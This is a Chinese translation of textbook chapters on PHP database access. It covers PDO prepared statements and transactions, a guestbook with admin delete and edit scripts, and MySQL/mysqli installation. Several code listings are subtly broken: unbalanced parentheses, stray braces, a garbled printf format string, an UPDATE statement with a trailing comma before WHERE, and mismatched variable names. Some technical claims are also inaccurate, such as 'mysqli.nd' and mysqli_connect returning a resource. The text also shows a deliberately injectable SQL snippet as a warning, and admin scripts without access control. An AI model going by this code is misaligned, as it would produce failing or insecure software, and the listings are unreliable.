> 根据数据库的不同，可能还需要进一步的安装步骤。例如，Microsoft SQL Server 的 PDO 驱动程序需要 Microsoft 为此数据库提供的 PHP 扩展存在（另请参见第 21 章）。因此，你应该始终查看在线手册，了解所选 PDO 驱动程序的当前要求。对于三个主要数据库：MySQL、PostgreSQL 和 SQLite，PHP 中已具备一切。

![](img/ae7820c36e8f24c1623d26668b28e80e_542_0.png)

图 18.1 "phpinfo()" 确认安装成功

## 18.2 使用 PDO 进行数据库访问

像往常一样，无论使用哪个数据库，步骤始终相同。首先，你需要知道如何建立连接，然后如何提交查询以及如何访问任何返回值（例如，针对 SELECT）。最后，查看数据库或（如本例中）扩展的特别之处始终是值得的。因此，我们将在整个本节中严格按照此顺序进行。

### 18.2.1 连接设置

要使用 PDO 建立到数据库的连接，你需要一个所谓的数据源名称（DSN）。这是一个字符串，一次性包含所有数据：数据库类型、URL（服务器或文件名）、连接选项和其他参数。你使用这样的 DSN 向 PDO 提供类所需的所有信息。因此，主要工作基本上是创建 DSN；PDO 负责其余部分（至少大部分是这样）。

DSN 的一般语法如下：

```
Database type(syntax)://user:password@host/database?option1=value1&option2=value2
```





当然，这听起来相当抽象，所以这里有几个例子：

- 建立与 SQLite 数据库（文件）的连接：`sqlite:file.db`
- 使用 `mysqli` 扩展建立与本地 MySQL 数据库的连接：`mysql:dbname=database name;host=localhost`
- 建立与引用 MS Access 文件的 ODBC 数据源的连接（是的，这也是可能的）：`odbc:Driver={Microsoft Access Driver (*.mdb)};Dbq=C:\\file.mdb`

接下来我们使用 MySQL 的 PDO 驱动程序。不过，你也可以使用任何其他 PDO 扩展，因为其余的 API 都是相同的！这正是 PDO 的一大亮点。

### 18.2.2 查询

PDO 对象使用 `new` 实例化。`exec()` 方法执行 SQL 命令。现在，你可以像下面的代码清单一样创建数据库表并向其中填充数据。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage());
    exit();
}
$sql = "CREATE TABLE my_table (
    id INTEGER PRIMARY KEY NOT NULL auto_increment,
    field VARCHAR(1000)
);";
$db->exec($sql);
$sql = "INSERT INTO my_table (field) VALUES ('value10');";
$db->exec($sql);
$sql = "INSERT INTO my_table (field) VALUES ('value11');";
$db->exec($sql);
?>
```

### 代码清单 18.1 使用 PDO 创建并填充表格（“pdo-create.php”）

如果你像示例中那样拥有一个静态 `INSERT` 命令，那么一切都没问题。如果使用用户输入来填充 SQL 命令的部分内容，就会变得危险。如第 32 章所示，如果用户输入中包含诸如撇号之类的特殊字符，就会存在许多危险。以下是一个简短的说明性示例：

```php
$value = $_POST["value"] ?? "";
$sql = "INSERT INTO table (field) VALUES ('$value')";
```

例如，如果查询的表单值是 Rasmus' invention，那么 $sql 将具有以下值：

```sql
INSERT INTO table (field) VALUES ('Rasmus invention')
```

这在语法上是不正确的，并会导致错误；第 32 章展示了更可怕的攻击可能性。

因此，了解如何对用户输入进行转义非常重要，这类似于本书许多示例中使用 htmlspecialchars() 输出所有数据的方式。不幸的是，没有一种针对 SQL 字符串的语句能够完全与数据库独立地工作（addslashes() 不是一个选项）。

但有一个更好的选择，它既更快一些，又更清晰。在 SQL 命令中所有动态插入数据的位置，只使用占位符——冒号开头的参数名称，不带撇号：

```php
$sql = "INSERT INTO table (field) VALUES (:fieldvalue)";
```

那么什么替代了占位符？你可以分几个步骤来处理：

- 1. 使用 prepare() 方法准备 SQL 命令（带占位符）以供数据库处理。
- 2. 使用 bindParam() 方法将值绑定到参数上（这些值必须是变量形式，因为这些变量是作为引用绑定的）。
- 3. 使用 execute() 方法最终执行命令。

这是一个非常实用（且通常也非常高性能）的选项，因此我们将展示另一个完整的代码清单，这次是所谓的参数化查询。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage());
    exit();
}

$sql = "INSERT INTO my_table (field) VALUES (:fieldvalue);";
$command = $db->prepare($sql);
$value = 'value12';
$command->bindParam(':fieldvalue', $value);
$command->execute();
echo 'Data entered.';
?>
```

### 代码清单 18.2 使用 PDO 和占位符填充表格（“pdo-query-placeholder.php”）

### 注意

或者，也可以将参数值作为数组传递给 execute()——但此时不带冒号：

```php
<?php
try {
  $db = new PDO("mysql:dbname=PHP;host=localhost",
    "user",
    "password");
} catch (PDOException $e) {
  echo 'Error: ' . htmlspecialchars($e->getMessage());
  exit();
}

$sql = "INSERT INTO my_table (field) VALUES (:fieldvalue);";
$command = $db->prepare($sql);
$command->execute([':fieldvalue' => 'value13']);
echo 'Data entered.';
?>
```

还有另一个快捷方式：除了带冒号的参数名称外，问号也是可行的。此时，一个索引数组作为 execute() 的参数就足够了：

```php
<?php
try {
  $db = new PDO("mysql:dbname=PHP;host=localhost",
    "user",
    "password");
} catch (PDOException $e) {
  echo 'Error: ' . htmlspecialchars($e->getMessage());
  exit();
}

$sql = "INSERT INTO my_table (field) VALUES (?);";
$command = $db->prepare($sql);
$command->execute(['value13']);
echo 'Data entered.';
?>
```

### 18.2.3 返回值

读取操作也支持参数，其他数据库系统也支持此功能。以下是再次概述的最重要要点：

- 参数是有名称的，因此没有“匿名”占位符。
- 语法如下：冒号加上名称。
- bindParam() 方法将一个值绑定到这些有名称的参数之一。
- prepare() 方法准备一个 SQL 命令。
- execute() 方法执行命令。

下一步是新内容：fetch() 方法读取表格的当前行。你将模式作为参数传递。你可以通过 PDO::FETCH_ASSOC/PDO::FETCH_OBJ 常量获得相关模式（关联数组或对象）。下面的代码清单读取刚刚输入的值。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage());
    exit();
}

$sql = "SELECT id, field FROM my_table WHERE id <> :id;";
$command = $db->prepare($sql);
$value = 0;
$command->bindParam(":id", $value); //value for parameter
$command->execute();
echo "<ul>";
while ($line = $command->fetch(PDO::FETCH_OBJ)) {
    echo "<li>" . htmlspecialchars($line->id) .
        ": " . htmlspecialchars($line->field) . "</li>";
}
echo "</ul>";
?>
```

### 代码清单 18.3 使用 PDO 读取表格（“pdo-read-placeholder.php”）

不使用占位符或参数读取数据更加简单。query() 方法返回一个查询对象。可以简单地使用 foreach 对其进行迭代；每次迭代中，结果列表的一行作为关联数组可用。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage());
    exit();
}

$sql = "SELECT id, field FROM my_table";
$result = $db->query($sql);
echo "<ul>";
foreach ($result as $row) {
    echo "<li>" . htmlspecialchars($row["id"]) .
        ": " . htmlspecialchars($row["field"]) . "</li>";
}
echo "</ul>";
?>
```

### 代码清单 18.4 使用 PDO 且不带参数读取表格（“pdo-read.php”）

### 18.2.4 特殊功能

尽管作为抽象层的 PDO 始终要追求最小公约数，但也有一些高级功能。本节将讨论最重要的事务。

第 17 章第 17.6.4 节中已经提到的事务也受 PDO 支持。与往常一样，了解相应方法的名称非常重要。以下是一目了然的最重要信息：

- beginTransaction() 方法启动一个事务。
- commit() 方法执行（提交）一个事务。
- rollBack() 方法取消一个事务并恢复初始状态。

下面的简短示例将两个值写入数据库。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage());
    exit();
}
$db = new PDO("mysql:dbname=compendium;host=localhost",
    "user",
    "password");
```





```php
$db->beginTransaction();
$sql = "INSERT INTO my_table (field) VALUES ('value13');";
$db->exec($sql);
$sql = "INSERT INTO my_table (field) VALUES ('value14');";
$db->exec($sql);
$db->commit(); //only now the SQL is executed!
?>
```

清单 18.5 在事务中使用 PDO 填充表格（"pdo-transaction.php"）

## 18.3 留言板

这里有一个小型应用程序示例。它实现了一个非常简单，但也常见的，因此与实践相关的功能。尽管结构简单，数据库编程的所有基本元素都已内置到功能中。

### 18.3.1 创建表

留言板条目保存在一个名为 guestbook 的单表中。该表由表 18.1 所示的字段组成。

| 字段名 | 数据类型 | 描述 |
|---|---|---|
| id | INTEGER PRIMARY KEY* | ID |
| heading | VARCHAR(1000) | 条目标题 |
| entry | VARCHAR(5000) | 条目内容 |
| author | VARCHAR(50) | 登记者姓名 |
| email | VARCHAR(100) | 登记者电子邮件地址 |
| date | TIMESTAMP | 条目时间 |
| \*根据数据库不同，数据类型的名称也不同。 | | |

表 18.1 留言板表的字段

以下清单仅创建表。

```php
<?php
try {
    $db = new PDO("mysql:dbname=PHP;host=localhost",
        "user",
        "password");
    $sql = "CREATE TABLE guestbook (
        id INTEGER AUTO_INCREMENT PRIMARY KEY,
        heading VARCHAR(1000),
        entry VARCHAR(5000),
        author VARCHAR(50),
        email VARCHAR(100),
        date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$db->exec($sql);
echo "Table created.";
} catch (PDOException $e) {
echo 'Error: ' . htmlspecialchars($e->getMessage()));
}
?>
```

清单 18.6 表已创建（"gb-create.php"）

### 18.3.2 输入数据

要输入数据，我们使用一个简单的 HTML 表单，用户可以在其中输入自己的数据。我们可以使用 time() 来确定条目时间，但由于时间戳在数据库更新期间会自动更新，因此我们不予处理。由于只有一个 INSERT 命令，我们不惜亲手编写 SQL 命令，但当然我们使用占位符。您可以在图 18.2 中看到表单。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
try {
$db = new PDO("mysql:dbname=PHP;host=localhost",
"user",
"password");
$sql = "INSERT INTO guestbook
(heading,
entry,
author,
email)
VALUES (?, ?, ?, ?)";
$values = [
    $_POST["Heading"],
    $_POST["Comment"],
    $_POST["Name"],
    $_POST["Email"]
];

$command = $db->prepare($sql);
$command->execute($values);
echo "Entry added.";
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage()));
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /> <br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

清单 18.7 可以输入数据（"gb-enter.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_550_0.png)

图 18.2 留言板签名表单

### 18.3.3 输出数据

数据库中的所有条目都使用 SELECT 循环读取。由于日期以 TIMESTAMP 格式提供，因此排序很容易。因此 SQL 命令如下，以便最新条目位于顶部：

```sql
SELECT * FROM guestbook ORDER BY date DESC
```

读取数据后，一个详尽的 printf() 语句确保一切格式良好（见图 18.3）。当然，来自数据库的所有数据都会先用 htmlspecialchars() 进行预处理，以便特殊字符也能正确显示。以下清单包含代码。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
try {
$db = new PDO("mysql:dbname=PHP;host=localhost",
"user",
"password");
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$result = $db->query($sql);
foreach ($result as $row) {
printf("<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
urlencode($row['email']),
htmlspecialchars($row['author']),
htmlspecialchars($row['date']),
htmlspecialchars($row['heading']),
htmlspecialchars($row['entry']))
nl2br(htmlspecialchars($row['entry']))
});
} catch (PDOException $e) {
echo 'Error: ' . htmlspecialchars($e->getMessage()));
}
?>
</body>
</html>
```

清单 18.8 输出留言板数据（"gb-show.php"）

> 提示
> 多行文本字段中的条目也可以包含换行符，这些换行符不会被 htmlspecialchars() 转换为 <br /> 元素。nl2br() 函数可在此提供补救措施。

![](img/ae7820c36e8f24c1623d26668b28e80e_552_0.png)

图 18.3 留言板中的所有条目（目前只有一个！）

这意味着留言板本身已经完整。但是，管理员应该能够稍后编辑条目——例如，为了采取措施应对淫秽内容。

### 18.3.4 删除数据

删除的第一个选项是简单地删除不可接受的条目。为此，您必须向数据源发送合适的 DELETE 命令。此过程分几个步骤完成。首先，从 gb-show.php 文件中复制一段代码来读取留言板数据库的内容。每个条目输出两个链接：一个用于删除，一个用于编辑（见图 18.4）。删除在同一页面上执行，因为这只是一个简单的 SQL 命令。编辑时，链接会重定向到另一个 PHP 脚本。相关条目的 ID 通过 URL 传递。链接如下所示：

```
<a href="gb-admin.php?id=1">Delete this entry</a>
<a href="gb-edit.php?id=1">Edit this entry</a>
```

出于安全考虑，删除时会先显示另一个链接，因此需要两次鼠标单击：³

```
<a href="gb-admin.php?id=1&amp;ok=1">Really delete?</a>
```

只有在那之后，脚本才会发送 DELETE 语句，同样使用占位符（在 WHERE 子句中）。因此并没有太多事情发生，但总共有 50 多行代码。

> ³ 我们意识到这仍然使应用程序面临跨站请求伪造的风险。在第 32 章中，您将找到有关此攻击及其应对措施的更多信息。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
    if (isset($_GET["ok"])) {
        try {
            $db = new PDO("mysql:dbname=PHP;host=localhost",
                "user",
                "password");
            $sql = "DELETE FROM guestbook WHERE id=?";
            $values = [$_GET["id"]];
            $command = $db->prepare($sql);
            $command->execute($values);
            echo "<p>Entry deleted.</p>
                <p><a href=\"gb-admin.php\">Back to overview
                </a> </p>";
        } catch (PDOException $e) {
            echo 'Error: ' . htmlspecialchars($e->getMessage());
        }
    } else {
        printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?
            </a>", urlencode($_GET["id"]));
    }
} else {
    try {
        $db = new PDO("mysql:dbname=PHP;host=localhost",
            "user",
            "password");
        $sql = "SELECT * FROM guestbook ORDER BY date DESC";
        $result = $db->query($sql);
        foreach ($result as $row) {
            printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this
                entry</a> - <a href=\"gb-edit.php?id=%s\">
                Edit this entry</a></b></p>
                <p><a href=\"mailto:%s\">%s</a> wrote on/at %s:</p>
                <h3><s<h3><%s><p><hr noshade=\"noshade\" />",
                urlencode($row["id"]),
                urlencode($row["id"]),
                htmlspecialchars($row["email"]),
                htmlspecialchars($row["author"]),
                htmlspecialchars($row["date"]),
```





```
htmlspecialchars($row["heading"])),
nl2br(htmlspecialchars($row["entry"])))
});
}
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage()));
}
}
?>
</body>
</html>
```

### 列表 18.9 带删除选项的所有数据显示 ("gb-admin.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_554_0.png)

### 图 18.4 新概览，包含删除和更改的链接

### 18.3.5 编辑数据

总而言之，可以说，压轴登场的是 UPDATE 命令。管理员甚至可以修改条目，4 虽然这稍微复杂一些。同样，URL 包含相关条目的 ID。SELECT 命令读取相关数据记录，并在 HTML 表单中输出。

> **注**
> 
> 此处使用第 13 章的技术。策略与表单的完整性检查和预填充类似：为每个表单字段创建一个初始为空的变量。然后，这些变量根据上下文分别从 $_POST 或数据库中填充值。最后，这些变量用于预填充表单字段。

4 由于管理员可以访问数据库，他无论如何都可以做到这一点；PHP 脚本只是让这个过程更加方便。

当用户发送（预填充的）表单时，这会导致 UPDATE SQL 命令。然后数据返回到数据库。以这种方式无法更改的唯一字段是条目的时间戳。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";

if (isset($_GET["id"]) &&
is_numeric($_GET["id"])) {

try {
$db = new PDO("mysql:dbname=PHP;host=localhost",
"user",
"password");

if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
$sql = "UPDATE guestbook SET
heading = ?,
entry = ?,
author = ?,
email = ?,
WHERE id=?";
$values = [
$_POST["Heading"],
$_POST["Comment"],
$_POST["Name"],
$_POST["Email"],
$_GET["id"]
];
$command = $db->prepare($sql);
$command->execute($values);
echo "<p> Entry changed.</p>
<p><a href="\gb-admin.php">Back to overview
</a>"
</p>";
}

$sql = "SELECT * FROM guestbook WHERE id=?";
$command = $db->prepare($sql);
$value = [$_GET["id"]];
$command->execute($value);
if ($row=$command->fetchObject()) {
    $Name = $row->author;
    $email = $row->email;
    $heading = $row->heading;
    $comment = $row->entry;
}
} catch (PDOException $e) {
    echo 'Error: ' . htmlspecialchars($e->getMessage()));
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

### 列表 18.10 编辑留言本条目 ("gb-edit.php")

功能齐全的留言本和管理区域已经准备就绪。不用说，你必须保护 _gb-admin.php_ 和 _gb-edit.php_ 脚本，以防止未经授权的人员访问它们。有关此的技巧和技术，请参见第 33 章。

# 第 19 章

MySQL

PHP 和 MySQL：这目前是万维网上编程语言和数据库最常见的组合。大多数 Web 应用程序仍然依赖 MySQL 数据库服务器（现属 Oracle 所有），这不仅仅是出于历史原因。

MySQL 被视为 PHP 的默认数据库；有些人甚至认为 PHP 与 MySQL 配合得特别好（这一点有待商榷），或者 PHP 仅支持 MySQL（这完全错误，如接下来的五个章节所示）。因此，市面上有许多名为 _PHP and MySQL_ 或类似书名的书籍——包括这一本。的确，在绝大多数情况下，MySQL 是与 PHP 一起使用的数据库。但在本书中，我们希望走得比许多其他书更远，因此将介绍所有相关数据库及其通过 PHP 的控制。

早期的 PHP 版本也通过自己的扩展 _mysql_ 支持 MySQL。然而，PHP 5 版本的一个亮点是一个全新的 MySQL 扩展 _mysqli_。其中的 _i_ 代表 _改进的_，或者正如愤世嫉俗者喜欢指出的，代表 _不兼容的_ 或 _不完整的_——尽管后一种解释不正确。两种扩展可以并行运行，但它们的函数名称不同。旧 MySQL 扩展提供名为 `mysql_*()` 的函数，而新扩展提供 `mysqli_*()`。在大多数情况下，函数名称相同。仅仅因为旧 MySQL 扩展已在 PHP 7 中删除，本章我们只处理适用于 MySQL 的较新、更好、更快的扩展 _mysqli_。

顺便说一句，MySQL 此后已被 Oracle 收购。一些开发者担心 Oracle 不再维护该数据库，因为该公司已有自己的数据库系统（另见第 22 章）。出于此原因，有人从 MySQL 源代码分叉出一个分支。这个分支称为 _MariaDB_。因此，数据库市场仍可能有新动态。

## 19.1 准备工作

首先，你需要安装 MySQL。源代码和二进制包可供下载，网址为 www.mysql.com/downloads；例如，在 https://dev.mysql.com/downloads/mysql 上，你会找到数据库服务器的 _社区版_，所有人都可免费使用。Mac 用户也能在这里找到所需内容。至于 Linux 等系统，大多数发行版会自动提供一个较新的 MySQL 版本。在 Windows 下，安装过程由菜单引导，你可以单独选择要安装的组件（选择“自定义”安装类型；参见图 19.1）。

![](img/ae7820c36e8f24c1623d26668b28e80e_558_0.png)

### 图 19.1 Windows 下方便的菜单引导式安装

在下载页面，有两个安装程序可供选择：较小的一个会从互联网下载所有所需包，而较大的一个包含所有内容，可离线使用。

> > **注**
> > 从 MySQL 8 版本开始，有一种新的密码加密方式。原则上建议使用它，但也要求远程站点至少使用 MySQL 客户端库 8 版本。PHP 在所有当前版本中均兼容。

除此之外，系统会要求你为 MySQL 管理员用户设置一个密码（尽可能安全！）；该用户名为 root。你还可以让 MySQL 在 Windows 启动时以服务形式自动运行。如果这样做并在安装后查看 Windows 任务管理器，你会发现确实有一个 MySQL 服务正在运行（参见图 19.2）。

顺便说一句，你可以更改此行为。在 Windows 控制面板的“管理工具”•“服务”中，可以调整 MySQL 服务的启动行为。例如，你可以阻止其自动启动，或暂时停止它（参见图 19.3）。

![](img/ae7820c36e8f24c1623d26668b28e80e_559_0.png)

### 图 19.2 任务管理器中的 MySQL 服务

![](img/ae7820c36e8f24c1623d26668b28e80e_559_1.png)

### 图 19.3 Windows 服务管理器中的 MySQL

在其他操作系统上，过程同样简单。你可以使用现成的 RPM 包——既可以在 MySQL 网站上找到，也可以从你喜欢的发行版提供商处获取：

```
rpm -i MySQL-server-<version number>.x86_64.rpm
```

或者你可以直接使用源代码手动编译，但通常此处没有必要。

对于 macOS，有一个方便的安装程序，封装在 DMG 映像中（参见图 19.4）。因此，你在这里也不应该遇到任何问题。

> **提示**
> 在 macOS 上，MySQL 甚至可能已经预安装！先检查一下，看看是否可以省略安装步骤。

![](img/ae7820c36e8f24c1623d26668b28e80e_560_0.png)

### 图 19.4 macOS 的 MySQL 安装包

安装 MySQL 后，你自然会希望使用图形用户界面来方便地管理 MySQL，因为命令行工具（mysql）使用起来相对麻烦。MySQL 自身为此提供了几种产品。最著名的是 MySQL Workbench，你可以在图 19.1 中看到它。该产品的单独下载（适用于各种操作系统）可在 https://dev.mysql.com/downloads/workbench/ 上获得。

在 MySQL Workbench 中（参见图 19.5），你应首先创建一个新用户（此处我们使用非常富有想象的组合：用户名为 user，密码为 password）。你还可以创建一个名为 PHP 的新数据库。在 MySQL Workbench 中，将数据库的所有权限分配给新用户。

长期以来，MySQL 的管理工具一直是该数据库的主要弱点；根本没有真正出色的官方 GUI。这就是为什么使用其他产品。最著名的大概是 phpMyAdmin，一个基于 Web 的 PHP 管理界面（参见图 19.6）。你可以免费从 www.phpmyadmin.net 下载它。





如有需要，解压缩存档并调整`config.inc.php`配置文件中的一些设置。你还必须在`php.ini`中启用`mbstring`扩展。

![](img/ae7820c36e8f24c1623d26668b28e80e_561_0.png)

图 19.5 MySQL Workbench

![](img/ae7820c36e8f24c1623d26668b28e80e_561_1.png)

图 19.6 phpMyAdmin警告配置不安全

### 作为"root"且无密码的连接设置

默认情况下，MySQL超级用户root的密码为空。phpMyAdmin的默认配置也如此。多年前，在一篇关于phpMyAdmin的杂志文章中，本行的作者曾机智地评论说这对于初步测试来说完全足够（居心叵测：这在生产系统中毫无立足之地！）。这反过来促使phpMyAdmin团队不仅给编辑写了一封愤怒的信，还发出了一条红色警告消息，当用户以root身份且密码为空时连接会显示该消息。几年后，这甚至被收紧，只有在事先进行额外配置后才允许无密码登录。我深感荣幸。

phpMyAdmin通过名为*config.inc.php*的文件进行配置。默认情况下不包含此文件，但*config.sample.inc.php*文件包含一个模板，你可以使用它来入门。你可以在在线用户手册中找到更多详细信息，网址为 http://s-prs.co/v602223。

如果一切正常，你将完全访问phpMyAdmin的强大功能。图 19.7显示起始页。

![](img/ae7820c36e8f24c1623d26668b28e80e_562_0.png)

图 19.7 phpMyAdmin的起始页（以root身份）

现在只缺少一小样东西，但至关重要：PHP的MySQL支持。Windows用户又很轻松：向*php.ini*添加一行——一切就绪。但是，自PHP 5.5版本起，"旧"扩展官方已弃用，并且还会引发E_DEPRECATED类型的警告。如已提及，PHP 8.x不再支持旧扩展（PHP 7也是如此）：

```
extension = mysqli # for the mysqli extension
 extension = php_mysql.dll # for the deprecated mysql extension
```

你还需要MySQL客户端库。幸运的是，这已经包含在内，并称为mysqli.nd。即使你没有启用MySQL扩展，在phpinfo()的输出中也会找到mysqli.nd的条目。

在Unix/Linux下，该扩展已集成到大多数发行版的二进制包中。如果你想自己编译，则需要为mysql扩展使用--with-mysql=/path/to/mysql配置开关。该扩展需要特殊程序mysql_config，该程序提供并接受配置选项。相应的开关随后称为--with-mysql=/path/to/mysql_config。因此，你在这里需要程序的完整路径，包括程序名。

然后值得再次调用phpinfo()（或php -m）以查看扩展是否处于活动状态。图 19.8显示了PHP 8.3下的输出。顺便说一句，MySQL的PDO扩展称为pdo_mysql，而非pdo_mysqli。

![](img/ae7820c36e8f24c1623d26668b28e80e_563_0.png)

图 19.8 “phpinfo()”输出中的“改进型”MySQL扩展

## 19.2 使用MySQL进行数据库访问

安装并配置MySQL后，其余部分不再是大问题。
现在最重要的步骤是建立连接、发送SQL命令，以及在必要时检查返回值。这正是你将在本节中看到的内容。作为基础，我们使用新创建的PHP数据库和名为user的用户。

### 19.2.1 连接设置

建立连接的函数称为mysqli_connect()。你可以指定最多六个参数，所有参数均为可选（归功于php.ini中的配置选项）：

- 1. 服务器名称
- 2. 用户名
- 3. 密码
- 4. 数据库名称（目录）
- 5. 端口号
- 6. 要使用的套接字名称

返回值是连接的句柄，你必须在其他MySQL函数中使用它。你使用mysqli_close()再次关闭连接。下面的清单显示了一个简单的测试示例。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    echo "Connection successful.";
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.1 使用MySQL进行连接设置（"mysqli-connect.php"）

如果你喜欢命名函数参数，可以按以下方式调用mysqli_connect()：

```php
mysqli_connect(
    host: "localhost",
    username: "user",
    passwd: "password",
    dbname: "PHP");
```

> 提示
>
> 你不一定必须随`mysqli_connect();`传递数据库名称；你也可以使用`mysqli_select_db()`函数。你向它传递连接的句柄和数据库名称：
>
> ```php
> <?php
> if ($db = mysqli_connect("localhost", "user", "password")) {
>     mysqli_select_db($db, "PHP");
>     echo "Connection successful.";
>     mysqli_close($db);
> } else {
>     echo "Error!";
> }
> ?>
> ```

`mysqli_connect()`的返回值是一个资源，因此类型为`resource`。这可以转换为整数值——以前是显式转换（通过添加`(int)`前缀），但自PHP 8起使用单独的函数：

```php
$id = get_resource_id(
    mysqli_connect( /* ... */ );
);
```

或者，MySQL扩展（但仅限`mysqli`）还提供面向对象访问。这有一个非常简单的规则：大多数`mysqli`函数随后可作为`MySQLi`对象的方法使用，同时删除`mysqli_`前缀。因此，`mysqli_close()`函数变成了`close()`方法。当然，也有对规则的小偏差，例如`mysqli_connect()`。对于此没有特殊方法，但它变成了对象的构造函数。下面的清单显示了面向对象风格的连接设置。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    echo "Connection successfully established.";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.2 使用MySQL进行连接设置（"mysqli-connect-oop.php"）

我们并列展示这两种方法，但始终以通过函数进行的"旧"访问为起点。这样做的原因是，通常可以不费太多劲地将应用程序移植到mysqli扩展，因为通常只需调整函数名。

### 19.2.2 查询

对于没有返回值的查询，使用mysqli_query()。你传递连接的句柄和SQL命令。在我们的示例中，我们在PHP数据库中创建一个测试表。同样值得注意的是，自动值的数据类型是如何实现的。在MySQL中，你使用INT AUTO_INCREMENT PRIMARY KEY。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "CREATE TABLE my_table (
    id INT AUTO_INCREMENT PRIMARY KEY,
    field VARCHAR(255)
    )";
    if (mysqli_query($db, $sql)) {
        echo "Table created.<br />";
    } else {
        echo "Error!";
    }
    $sql = "INSERT INTO my_table (field) VALUES ('Value1')";
    if (mysqli_query($db, $sql)) {
        echo "Data entered.<br />";
    } else {
        echo "Error!";
    }
    $sql = "INSERT INTO my_table (field) VALUES ('value2')";
    if (mysqli_query($db, $sql)) {
        echo "Data entered.";
    } else {
        echo "Error!";
    }
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.3 表被创建并填充（"mysqli-query.php"）

面向对象API中变化不大；本质上，mysqli_query()被query()方法取代。

```php
<?php
try {
  $db = new MySQLi("localhost", "user", "password", "PHP");
  $sql = "CREATE TABLE my_table (
    id INT AUTO_INCREMENT PRIMARY KEY,
    field VARCHAR(255)
  )";
  $db->query($sql);
  echo "Table created.<br />";

  $sql = "INSERT INTO my_table (field) VALUES ('value1')";
  $db->query($sql);
  echo "Data entered.<br />";

  $sql = "INSERT INTO my_table (field) VALUES ('Value2')";
  $db->query($sql);
  echo "Data entered.";

  $db->close();
} catch (Exception $ex) {
  echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.4 表被创建并填充（"mysqli-query-oop.php"）

将静态值写入数据库（如示例中）没有安全问题。但是，对于来自表单数据、URL或Cookie等动态值，情况则不同。这里你必须防止输入中危险字符（另见第32章）。为此，有`mysqli_real_escape_string()`函数或`real_escape_string()`方法，例如将撇号转换为字符串`\\'`。下面是相应的代码片段：

```php
$value = $_POST["value"] ?? "";
$value = mysqli_real_escape_string($db, $value);
// alternatively: $value = $db->real_escape_string($value);
$sql = "INSERT INTO my_table (field) VALUES ('$value')";
```

> **注意**
>
> 为什么`mysqli_real_escape_string()`需要数据库连接的句柄？
> 这是个合理的问题，但有个好答案：在掩码数据时会考虑连接的字符集。函数名中的`real`部分也暗示了这一点。

1 顺便说一句，这与其他一些数据库不同，在这些数据库中，撇号需要通过加倍（''）来"降级"。





但它可以比使用 `mysqli_real_escape_string()` 更简单——同样安全，使用所谓的参数化查询。诀窍是你只需在 SQL 命令中输入占位符，然后将值绑定到占位符。PHP 或 MySQL 会完全自动处理特殊字符的正确转换，因此你不再需要担心此问题。参数化 SQL 语句如下所示：

```
INSERT INTO my_table (field) VALUES (?)
```

必须使用 `mysqli_prepare()` 准备此命令，并将命令对象作为返回值接收：

```
$command = mysqli_prepare($db, "INSERT INTO my_table (field) VALUES (?)");
```

使用 `mysqli_stmt_bind_param()` 函数（或者，如果你偏好 OOP 访问，使用命令对象的 `bind_param()` 方法），可以将值绑定到占位符。为此，首先需要一个包含所用数据类型的字符串参数。共有四种可能性：

- b: 数据类型 BLOB  
- d: 数据类型 double  
- i: 数据类型 integer  
- s: 数据类型 string  

